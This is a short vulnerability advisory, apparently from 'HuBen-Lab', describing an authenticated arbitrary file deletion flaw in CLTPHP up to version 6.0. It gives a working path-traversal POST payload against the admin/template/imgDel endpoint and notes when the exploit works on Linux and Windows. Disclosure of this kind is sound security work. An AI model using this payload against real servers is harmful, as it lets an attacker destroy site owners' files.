# CLTPHP <= 6.0 Improper Input Validation 1
## Description
    The system client did not handle the parameters correctly, resulting in arbitrary file deletion.
## Vendor Homepage
    https://gitee.com/chichu/cltopen/
    https://www.cltphp.com/

## Author
    HuBen-Lab
## Proof of Concept
File:`application/admin/controller/Template.php `

Exploiting this vulnerability requires logging into the system.

payload:

```
admin/template/imgDel 

post：folder=../../../../../../../../../&filename=tmp/123
```

The method of writing output has been executed, but because the images directory does not exist by default, the exploit will fail. If the images directory exists, it can be exploited normally (linux platform).
If it is in windows is not affected by the images directory, you can use the vulnerability normally

![904e02166c4d170896c1e8af7628c77](img/904e02166c4d170896c1e8af7628c77.jpg)

![image-20230105162650735](img/63b7c3d0a2ce6.png)